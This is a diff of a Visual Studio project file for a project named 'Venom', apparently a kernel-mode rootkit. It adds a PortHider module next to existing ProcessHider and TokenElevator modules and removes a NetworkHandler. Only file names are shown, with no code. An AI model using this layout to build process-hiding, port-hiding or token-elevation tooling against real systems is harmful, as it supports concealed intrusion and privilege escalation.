@@ -154,11 +154,11 @@
     <ClCompile Include="FastMutex.cpp" />
     <ClCompile Include="IoctlHandlers.cpp" />
     <ClCompile Include="lib\Alloc.cpp" />
-    <ClCompile Include="NetworkHandler.cpp" />
     <ClCompile Include="lib\Process.cpp" />
     <ClCompile Include="Capabilities\ProcessCapabilities\ProcessHider.cpp" />
     <ClCompile Include="Capabilities\TokenCapabilities\TokenElevator.cpp" />
     <ClCompile Include="lib\Thread.cpp" />
+    <ClCompile Include="Capabilities\NetworkCapabilites\PortHider.cpp" />
     <ClCompile Include="Venom.cpp" />
   </ItemGroup>
   <ItemGroup>
@@ -179,12 +179,11 @@
     <ClInclude Include="lib\UniquePtr.h" />
     <ClInclude Include="lib\Utils.h" />
     <ClInclude Include="lib\Vector.h" />
-    <ClInclude Include="NativeStructs.h" />
-    <ClInclude Include="NetworkHandler.h" />
     <ClInclude Include="lib\Process.h" />
     <ClInclude Include="Capabilities\ProcessCapabilities\ProcessHider.h" />
     <ClInclude Include="Capabilities\TokenCapabilities\TokenElevator.h" />
     <ClInclude Include="lib\Thread.h" />
+    <ClInclude Include="Capabilities\NetworkCapabilites\PortHider.h" />
     <ClInclude Include="Venom.h" />
   </ItemGroup>
   <ItemGroup>
